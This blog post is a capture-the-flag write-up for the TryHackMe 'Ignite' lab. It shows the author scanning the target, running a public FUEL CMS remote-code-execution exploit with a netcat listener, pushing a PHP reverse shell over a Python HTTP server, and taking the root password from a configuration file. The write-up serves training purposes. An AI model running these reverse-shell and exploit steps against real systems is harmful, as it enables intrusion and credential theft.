---
layout: post
title:  TryHackMe | Ignite Writeup
author:  sudosuraj
date:  2024-01-31
categories:  [CTF]
tags:  [TryHackMe,writeup]
image:
  path: /assets/img/headers/ignite.png
  alt: ignite
---
#  TryHackMe | Ignite Writeup
![image](https://tryhackme-badges.s3.amazonaws.com/0xbug.png)  
Hello friend!  
In this write up we gonna explore a THM ctf called Iginte.  
Here is tryhackme link : [Ignite](https://tryhackme.com/room/ignite)  
Level: Easy  
## Info Gathering and enumeration
###  Port Scanning
```@bash
nmap -sCV 10.10.232.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-31 12:42 IST
Nmap scan report for 10.10.232.66
Host is up (0.17s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
```

visiting webpage we got this  
![image](https://github.com/sudosuraz/sudosuraz.github.io/assets/81553118/28eed893-e321-4f0f-8787-a1c8fee80725)  

after google search I found this exploit for this CMS on github : https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated  
```@bash
git clone https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated.git
cd Fuel-1.4.1-RCE-Updated
```
##  Initial Access
terminal 1  
```@bash
nc -lvnp 1337
```
Terminal 2  
```@bash
python3 Fuel-Updated.py http://10.10.232.66 10.17.126.99 1338
```
and we got shell access,  
![image](https://github.com/sudosuraz/sudosuraz.github.io/assets/81553118/360958db-0ead-423e-bea1-51c5345fe08d)  

To convert it into reverse shell, transfer edited php rev shell into victim machine using python.  
```@bash
php-reverse-shell.php
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
![image](https://github.com/sudosuraz/sudosuraz.github.io/assets/81553118/10ae037a-5890-428d-8a06-8d4b04a57e65)

Now, take revshell for full shell access!!!

##  Privilege Escalation
For privilege escalation part, I enumerated all the method and techniques, but not work,  
but when I check the web page again, I found a configuration file mentioned there.  
** fuel/application/config/database.php **  
In this file, I found the root user's password!!!

##  Final Notes!
That's it guys, I hope you may find this useful, feel free for suggestion and improvements in writeup.  
##  Be My Friend!
- [**LinkedIn**](https://www.linkedin.com/in/sudosuraj)
- [**Instagram**](https://www.instagram.com/sudosuraj)
- [**Telegram**](https://telegram.me/sudosuraz)
- [**Twitter**](https://twitter.com/sudosuraj)
- [**Github**](https://github.com/sudosuraz)
- [**Hackerone**](https://hackerone.com/init06)
- [**Bugcrowd**](https://bugcrowd.com/sudosuraj)
- [**TryHackMe**](https://tryhackme.com/p/0xbug)

